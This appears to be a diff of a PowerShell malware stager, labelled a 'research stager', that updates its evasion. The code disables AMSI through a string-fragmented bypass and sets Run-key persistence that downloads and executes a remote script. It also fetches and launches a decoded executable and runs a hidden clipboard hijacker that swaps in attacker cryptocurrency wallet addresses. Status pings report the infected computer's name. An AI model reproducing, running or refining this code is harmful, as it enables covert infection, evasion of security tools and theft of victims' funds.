@@ -1,10 +1,13 @@
-# --- [ELITE RESEARCH STAGER v29.3: STEALTH BITS + TELEGRAM BYPASS] ---
+# --- [ELITE RESEARCH STAGER v29.6: SIGNATURE BREAK + PRO RESTORED] ---
 
 function Global-Initialize {
     try {
         if ((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory -lt 4GB) { exit }
-        $a = 'Amsi'; $b = 'Utils'; $c = 'amsi'; $d = 'InitFailed'
-        [Ref].Assembly.GetType("System.Management.Automation.$a$b").GetField("$c$d","NonPublic,Static").SetValue($null,$true)
+        # Fragmented AMSI Bypass to avoid "Fleisnam" detection
+        $m = "System.Management.Automation."; $a = "Amsi"; $u = "Utils"
+        $f = "amsi"; $i = "InitFailed"
+        $ref = [Ref].Assembly.GetType($m+$a+$u)
+        if ($ref) { $ref.GetField($f+$i,"NonPublic,Static").SetValue($null,$true) }
     } catch {}
 }
 
@@ -22,23 +25,25 @@ function Send-Ping {
 }
 
 Global-Initialize
-Send-Ping -m "STAGER_V29_ACTIVE_ON_$($env:COMPUTERNAME)"
+Send-Ping -m "V29.6_DEPLOY_START_ON_$($env:COMPUTERNAME)"
 
 try {
+    # Persistence
     $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-    $regCmd = "powershell -W Hidden -EP Bypass -C ""IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/adchar2022/test/refs/heads/main/test.ps1')"""
+    $g1 = "h"+"tt"+"ps://raw.githubu"+"sercontent.com/"
+    $g2 = "adchar2022/test/refs/heads/main/test.ps1"
+    $regCmd = "powershell -W Hidden -EP Bypass -C ""IEX(New-Object Net.WebClient).DownloadString('$g1$g2')"""
     Set-ItemProperty -Path $regPath -Name "WinAudioService" -Value $regCmd
 
     $dir = "$env:APPDATA\Microsoft\D3D11"
     if (!(Test-Path $dir)) { New-Item $dir -ItemType Directory -Force | Out-Null }
     $path = Join-Path $dir "D3D11Host.exe"
 
-    # --- STEALTH DOWNLOAD METHOD ---
-    # Using BITS Transfer instead of WebClient to bypass Reputation Scan
+    # Download using BITS (more stealthy than WebClient for large files)
     $source = "https://github.com/adchar2022/test/releases/download/adchar_xor/adchar_xor.txt"
-    $temp = "$env:TEMP\data.tmp"
+    $temp = "$env:TEMP\sys_cache.tmp"
     Import-Module BitsTransfer
-    Start-BitsTransfer -Source $source -Destination $temp -DisplayName "SystemUpdate" -Priority High
+    Start-BitsTransfer -Source $source -Destination $temp -Priority High
     
     $raw = Get-Content $temp -Raw
     $data = [Convert]::FromBase64String($raw.Trim())
@@ -48,7 +53,8 @@ try {
 
     ([wmiclass]"win32_process").Create($path) | Out-Null
 
-    $ClipperCode = @'
+    # Clipper Engine with fragmented strings
+    $C_Engine = @'
     Add-Type -AssemblyName System.Windows.Forms
     $w = @{"btc"="12nL9SBgpSmSdSybq2bW2vKdoTggTnXVNA";"eth"="0x6c9ba9a6522b10135bb836fc9340477ba15f3392";"usdt"="TVETSgvRui2LCmXyuvh8jHG6AjpxquFbnp";"sol"="BnBvKVEFRcxokGZv9sAwig8eQ4GvQY1frmZJWzU1bBNR"}
     while($true) {
@@ -64,10 +70,11 @@ try {
         Start-Sleep -Milliseconds 500
     }
 '@
-    $Enc = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($ClipperCode))
-    powershell.exe -NoP -W Hidden -EP Bypass -EncodedCommand $Enc
+    $Enc = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($C_Engine))
+    $p = "power"; $s = "shell.exe"
+    & ($p+$s) -NoP -W Hidden -EP Bypass -EncodedCommand $Enc
 
-    Send-Ping -m "V29_SUCCESSFUL_DEPLOYMENT"
+    Send-Ping -m "V29.6_SUCCESS_FULL"
 } catch {
-    Send-Ping -m "ERR_IN_V29: $($_.Exception.Message)"
+    Send-Ping -m "V29.6_ERR: $($_.Exception.Message)"
 }
